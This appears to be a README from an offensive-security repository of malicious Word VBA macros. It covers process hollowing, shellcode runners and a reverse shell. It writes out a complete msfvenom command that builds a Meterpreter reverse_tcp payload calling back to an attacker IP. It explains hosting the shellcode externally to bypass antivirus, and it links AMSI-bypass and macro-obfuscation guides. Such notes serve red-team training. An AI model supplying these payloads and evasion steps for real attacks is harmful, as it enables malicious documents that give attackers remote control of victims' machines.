# Word macros
### Process hollowing
Process hollowing that also works on 32 bit:
https://gist.github.com/Mayfly277/6edbcf3be63921b5071183e1cfdb3ea8

Your payload size will be shown in the output of your msfvenom command. Make sure to put that in on line 162. 


Original 64 bit version:
https://github.com/ColeHouston/word-vba-process-hollowing/blob/main/macro.vb


### msfhex_inject.vba
32 bit only
Hosts the shellcode externally to bypass AV
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.xx.xxx LPORT=4444 EXITFUNC=thread -f hex > shellcode.txt
Host with https://github.com/beauknowstech/gup or `python3 -m http.server`

make sure to change the IP on line 87


### shellcode_runner.vba
Converted https://arttoolkit.github.io/wadcoms/ShellcodeRunner-VBA/ to 32 bit.


## Other resources:

https://github.com/S3cur3Th1sSh1t/OffensiveVBA/tree/main/src

https://github.com/hackinaggie/OSEP-Tools-v2/tree/main/Macros

https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/

https://www.depthsecurity.com/blog/obfuscating-malicious-macro-enabled-word-docs/

https://www.youtube.com/watch?v=KeSRGjnTdSc

https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/

https://medium.com/@luisgerardomoret_69654/obfuscating-office-macros-to-evade-defender-468606f5790c

https://github.com/Inf0secRabbit/BadAssMacros

https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba

